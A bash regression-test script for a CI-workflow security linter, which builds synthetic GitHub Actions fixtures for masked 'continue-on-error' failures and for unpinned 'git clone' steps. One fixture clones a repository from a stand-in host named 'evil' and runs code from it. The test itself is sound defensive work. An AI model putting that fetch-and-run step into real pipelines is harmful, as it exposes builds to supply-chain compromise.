#!/bin/bash
# Regression tests for the CI-workflow security lints in validate-fgt.mjs:
# - checkWorkflowContinueOnError (BUG-029 pattern, with `|| true` advisory exception)
# - checkWorkflowGitClonePinned (CP-020 unpinned-clone class)
#
# Creates synthetic project dirs with bad/good workflow fixtures and
# asserts the validator reports the expected ERRORs/WARNs.
#
# Usage: bash scripts/test-validate-fgt.sh
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
ROOT_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"
VALIDATOR="$SCRIPT_DIR/validate-fgt.mjs"
PASS=0
FAIL=0
TMPROOT=""

cleanup() {
    [ -n "$TMPROOT" ] && rm -rf "$TMPROOT"
}
trap cleanup EXIT

assert_contains() {
    local output="$1" pattern="$2" label="$3"
    if echo "$output" | grep -q "$pattern"; then
        PASS=$((PASS + 1))
    else
        echo "  FAIL: $label — '$pattern' not found in output"
        echo "  ----- output -----"
        echo "$output" | sed 's/^/    /'
        echo "  ------------------"
        FAIL=$((FAIL + 1))
    fi
}

assert_not_contains() {
    local output="$1" pattern="$2" label="$3"
    if echo "$output" | grep -q "$pattern"; then
        echo "  FAIL: $label — '$pattern' unexpectedly found in output"
        FAIL=$((FAIL + 1))
    else
        PASS=$((PASS + 1))
    fi
}

make_synthetic_project() {
    local dir="$1"
    mkdir -p "$dir/.github/workflows"
    # Minimum files so the project-level checks don't choke
    touch "$dir/BUG_PATTERNS_TEST.md" "$dir/BACKLOG.md" "$dir/FGT_LOG.md"
}

TMPROOT=$(mktemp -d)
echo "=== validate-fgt.mjs regression tests (fixtures under $TMPROOT) ==="

# ─────────────────────────────────────────────────────────────────────
# Test 1: bare `continue-on-error: true` without `|| true` → ERROR
# ─────────────────────────────────────────────────────────────────────
T1="$TMPROOT/t1_bare_continue_on_error"
make_synthetic_project "$T1"
cat > "$T1/.github/workflows/bad.yml" << 'YAMLEOF'
name: bad
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: masked-blocking-check
        run: npm test
        continue-on-error: true
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T1" 2>&1 || true)
assert_contains "$OUT" "BUG-029" "T1: bare continue-on-error emits BUG-029 ERROR"
assert_contains "$OUT" "bad.yml:9" "T1: error points at continue-on-error line"

# ─────────────────────────────────────────────────────────────────────
# Test 2: `continue-on-error: true` WITH `|| true` in same step's
# run body is advisory — NOT flagged
# ─────────────────────────────────────────────────────────────────────
T2="$TMPROOT/t2_advisory"
make_synthetic_project "$T2"
cat > "$T2/.github/workflows/advisory.yml" << 'YAMLEOF'
name: advisory
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: informational-scan
        run: python -m vulture src/ || true
        continue-on-error: true
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T2" 2>&1 || true)
assert_not_contains "$OUT" "BUG-029" "T2: advisory (|| true + coe) is not flagged"
assert_contains "$OUT" "FGT structure validation passed" "T2: overall validation passes"

# ─────────────────────────────────────────────────────────────────────
# Test 3: adjacent steps — first advisory, second bare — only second
# is flagged (step boundary walk works)
# ─────────────────────────────────────────────────────────────────────
T3="$TMPROOT/t3_boundary"
make_synthetic_project "$T3"
cat > "$T3/.github/workflows/mix.yml" << 'YAMLEOF'
name: mix
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: advisory-step
        run: vulture || true
        continue-on-error: true
      - name: bare-step
        run: npm test
        continue-on-error: true
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T3" 2>&1 || true)
# Bare step is line 12 (the second continue-on-error)
assert_contains "$OUT" "mix.yml:12" "T3: bare step at line 12 is flagged"
# Advisory step is line 9 — must NOT appear as BUG-029 error
assert_not_contains "$OUT" "mix.yml:9" "T3: advisory step at line 9 is not flagged"

# ─────────────────────────────────────────────────────────────────────
# Test 4: unpinned `git clone` of external HTTPS URL in workflow → WARN
# ─────────────────────────────────────────────────────────────────────
T4="$TMPROOT/t4_unpinned_clone"
make_synthetic_project "$T4"
cat > "$T4/.github/workflows/clone.yml" << 'YAMLEOF'
name: clone
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: unpinned
        run: |
          git clone --depth 1 https://github.com/evil/xyz /tmp/x
          node /tmp/x/run.mjs
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T4" 2>&1 || true)
assert_contains "$OUT" "unpinned" "T4: unpinned git clone emits WARN"

# ─────────────────────────────────────────────────────────────────────
# Test 5: pinned via SHA literal in same line → clean
# ─────────────────────────────────────────────────────────────────────
T5="$TMPROOT/t5_pinned_sha_literal"
make_synthetic_project "$T5"
cat > "$T5/.github/workflows/pinned.yml" << 'YAMLEOF'
name: pinned
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: pinned-literal
        run: |
          git clone https://github.com/upstream/dep /tmp/d
          git -C /tmp/d checkout abc123def456abc123def456abc123def456abcd
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T5" 2>&1 || true)
assert_not_contains "$OUT" "unpinned" "T5: SHA literal within 10 lines counts as pinned"

# ─────────────────────────────────────────────────────────────────────
# Test 6: pinned via *_SHA env var reference → clean
# ─────────────────────────────────────────────────────────────────────
T6="$TMPROOT/t6_pinned_sha_env"
make_synthetic_project "$T6"
cat > "$T6/.github/workflows/env-pinned.yml" << 'YAMLEOF'
name: env-pinned
on: push
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: pinned-env
        env:
          DEP_SHA: abc123def456abc123def456abc123def456abcd
        run: |
          git clone https://github.com/upstream/dep /tmp/d
          git -C /tmp/d checkout "$DEP_SHA"
YAMLEOF
OUT=$(node "$VALIDATOR" --project "$T6" 2>&1 || true)
assert_not_contains "$OUT" "unpinned" "T6: *_SHA env var ref counts as pinned"

# ─────────────────────────────────────────────────────────────────────
# Test 7: no `.github/workflows/` directory → both lints silent
# ─────────────────────────────────────────────────────────────────────
T7="$TMPROOT/t7_no_workflows"
make_synthetic_project "$T7"
rm -rf "$T7/.github"
OUT=$(node "$VALIDATOR" --project "$T7" 2>&1 || true)
assert_not_contains "$OUT" "BUG-029" "T7: no workflows dir → no BUG-029 flags"
assert_not_contains "$OUT" "unpinned" "T7: no workflows dir → no unpinned flags"

# ─────────────────────────────────────────────────────────────────────
# Results
# ─────────────────────────────────────────────────────────────────────
echo ""
echo "=== Results: $PASS passed, $FAIL failed ==="
[ "$FAIL" -eq 0 ]
